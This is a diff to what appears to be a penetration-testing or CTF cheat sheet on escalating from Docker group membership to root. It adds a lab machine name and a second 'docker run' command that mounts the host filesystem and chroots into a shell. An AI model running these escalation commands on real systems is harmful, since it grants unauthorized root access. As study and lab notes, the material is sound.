@@ -1,6 +1,6 @@
 # Docker Group → Root
 
-Used on: **Kobold, marketplace**
+Used on: **Kobold, marketplace, ultratech1**
 
 Membership in the `docker` group is equivalent to root on the host, because any user who can talk to the Docker daemon can run a privileged container that bind-mounts `/`.
 
@@ -47,7 +47,10 @@ docker run --rm -i --privileged -v /:/hostfs --user root \
 <!-- cmd: linux -->
 ```bash
 docker run -v /:/host -it alpine chroot /host /bin/bash
+docker run -v /:/mnt --rm -it 495d6437fc1e chroot /mnt /bin/sh
 ```
+
+Used on: **Kobold**, **ultratech1**
 
 ## Docker Socket Exposed but No CLI
 
